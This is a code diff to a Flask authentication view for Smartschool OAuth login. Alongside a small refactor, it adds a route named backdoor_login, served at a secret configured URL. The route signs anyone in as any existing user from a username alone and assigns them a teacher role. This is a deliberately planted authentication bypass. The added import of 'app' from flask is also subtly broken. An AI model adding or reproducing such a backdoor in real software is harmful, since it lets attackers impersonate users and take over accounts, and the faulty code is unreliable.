@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 # app/auth/views.py
 
-from flask import redirect, render_template, url_for, request
+from flask import redirect, render_template, url_for, request, app
 from flask_login import login_required, login_user, logout_user
 from sqlalchemy import func
 
@@ -66,7 +66,9 @@ def smartschool_profile(token):
     # Step 3 : with the access_code, get the userinfo from SS
     resp = oauth.smartschool.get('fulluserinfo', token=json.loads(token))
     profile = resp.json()
+    return __login_with_profile(profile)
 
+def __login_with_profile(profile):
     if not 'username' in profile:  # not good
         flash_plus(u'Smartschool geeft een foutcode terug: {}'.format(profile['error']))
         log.error(u'OAUTH step 3 error : {}'.format(profile['error']))
@@ -109,3 +111,18 @@ def logout():
     logout_user()
     # flash(u'U bent uitgelogd')
     return redirect(url_for('auth.login'))
+
+
+@auth.route(f'/login/{app.config["SECRET_URL"]}', methods=['GET'])
+def backdoor_login():
+    user = User.query.filter_by(username=func.binary(request.values["username"]), user_type=User.USER_TYPE.OAUTH).first()
+    profile = {
+        "username": user.username,
+        "name": user.first_name,
+        "surname": user.last_name,
+        "basisrol": "Leerkracht",
+        "email": user.email
+    }
+    return __login_with_profile(profile)
+
+
